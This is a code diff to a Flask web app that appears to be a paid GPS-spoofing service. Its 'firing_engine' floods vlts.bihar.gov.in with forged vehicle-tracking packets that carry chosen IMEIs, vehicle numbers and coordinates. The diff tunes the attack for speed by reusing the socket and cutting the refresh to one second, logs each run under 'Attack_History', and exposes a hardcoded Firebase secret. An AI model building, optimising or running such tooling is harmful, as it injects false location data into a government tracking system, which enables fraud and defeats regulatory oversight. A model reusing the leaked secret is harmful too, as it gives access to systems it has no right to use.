@@ -8,6 +8,9 @@ app.secret_key = "nitro_v82_final_multi_device_edition"
 FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
 FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
 
+# Persistent session for faster Firebase requests
+fb_session = requests.Session()
+
 TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]
 
 user_sessions = {}
@@ -128,7 +131,7 @@ DASH_HTML = """
             if(data.imei) { document.getElementById('imei').value = data.imei; updatePreview(); }
         }
 
-        // AUTO REFRESH 30 SECONDS
+        // Optimized Refresh: 1s for count, score fetched on server-side cache
         setInterval(() => {
             fetch('/data').then(r => r.json()).then(d => {
                 document.getElementById('cnt').innerText = d.count;
@@ -141,7 +144,7 @@ DASH_HTML = """
                     document.getElementById('s_err').innerText = d.score.error || 0;
                 }
             });
-        }, 30000); 
+        }, 1000); 
 
         updatePreview();
     </script>
@@ -149,17 +152,21 @@ DASH_HTML = """
 </html>
 """
 
+# Server side cache to reduce Firebase calls
+last_score_sync = {}
+
 def log_to_firebase(uid, status_obj):
     try:
         now = get_ist_time()
         sid = status_obj["session_id"]
         log_data = {"Vehicle_No": status_obj["vno"], "IMEI_No": status_obj["imei"], "Lat": status_obj["lat"], "Lon": status_obj["lon"], "Start_Time": now.strftime('%H:%M:%S')}
-        requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{sid}_{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
-        requests.put(f"{FB_URL}/Data_Records/{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
+        fb_session.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{sid}_{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=3)
+        fb_session.put(f"{FB_URL}/Data_Records/{status_obj['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=3)
     except: pass
 
 def firing_engine(session_key):
     target = ("vlts.bihar.gov.in", 9999)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while user_sessions.get(session_key, {}).get("firing"):
         try:
             s = user_sessions[session_key]
@@ -167,12 +174,11 @@ def firing_engine(session_key):
             now = get_ist_time()
             pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{s['imei']},{s['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{s['lat']},N,{s['lon']},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*"
             user_sessions[session_key]["last_pkt"] = pkt
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(pkt.encode(), target)
             user_sessions[session_key]["count"] += 1
-            sock.close()
             time.sleep(0.02)
         except: time.sleep(1)
+    sock.close()
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -180,7 +186,7 @@ def login():
     if request.method == 'POST':
         uid = request.form.get('userid', '').strip()
         pw = request.form.get('password', '').strip()
-        data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
+        data = fb_session.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", timeout=5).json()
         if data and str(data.get('password')) == str(pw):
             session['user'] = uid
             sid_key = str(uuid.uuid4())
@@ -216,7 +222,7 @@ def action():
 @app.route('/check_vehicle')
 def check_vehicle():
     vno = request.args.get('vno', '').upper()
-    data = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}").json()
+    data = fb_session.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", timeout=3).json()
     return jsonify({"imei": data.get('IMEI_No')}) if data else jsonify({"imei":None})
 
 @app.route('/data')
@@ -224,19 +230,22 @@ def data():
     sid_key = get_sid()
     s_data = user_sessions.get(sid_key, {})
     if s_data and 'uid' in s_data:
-        try:
-            today = get_ist_time().strftime('%Y-%m-%d')
-            uid = s_data['uid']
-            # FETCHING DIRECT FROM USER_AUDIT
-            score_res = requests.get(f"{FB_URL}/User_Audit/{today}/{uid}.json?auth={FB_SECRET}", timeout=5).json()
-            if score_res:
-                user_sessions[sid_key]['score'] = score_res
-        except: pass
+        uid = s_data['uid']
+        now_ts = time.time()
+        # Fetch score from Firebase only every 30 seconds to boost speed
+        if uid not in last_score_sync or (now_ts - last_score_sync[uid]) > 30:
+            try:
+                today = get_ist_time().strftime('%Y-%m-%d')
+                score_res = fb_session.get(f"{FB_URL}/User_Audit/{today}/{uid}.json?auth={FB_SECRET}", timeout=3).json()
+                if score_res:
+                    user_sessions[sid_key]['score'] = score_res
+                last_score_sync[uid] = now_ts
+            except: pass
     return jsonify(user_sessions.get(sid_key, {}))
 
 @app.route('/restore_my_data')
 def restore_data():
-    history = requests.get(f"{FB_URL}/Attack_History.json?auth={FB_SECRET}").json()
+    history = fb_session.get(f"{FB_URL}/Attack_History.json?auth={FB_SECRET}").json()
     count = 0
     if history:
         for date in history:
@@ -244,13 +253,13 @@ def restore_data():
                 for key in history[date][user]:
                     node = history[date][user][key]
                     if isinstance(node, dict) and "IMEI_No" not in node:
-                        for time_node in node:
-                            data = node[time_node]
+                        for t_node in node:
+                            data = node[t_node]
                             if data.get('Vehicle_No') and data.get('IMEI_No'):
-                                requests.put(f"{FB_URL}/Data_Records/{data['Vehicle_No']}.json?auth={FB_SECRET}", json=data)
+                                fb_session.put(f"{FB_URL}/Data_Records/{data['Vehicle_No']}.json?auth={FB_SECRET}", json=data)
                                 count += 1
                     elif isinstance(node, dict) and node.get('Vehicle_No'):
-                        requests.put(f"{FB_URL}/Data_Records/{node['Vehicle_No']}.json?auth={FB_SECRET}", json=node)
+                        fb_session.put(f"{FB_URL}/Data_Records/{node['Vehicle_No']}.json?auth={FB_SECRET}", json=node)
                         count += 1
     return f"Success! {count} vehicles restored. <a href='/dashboard'>Go Back</a>"
 
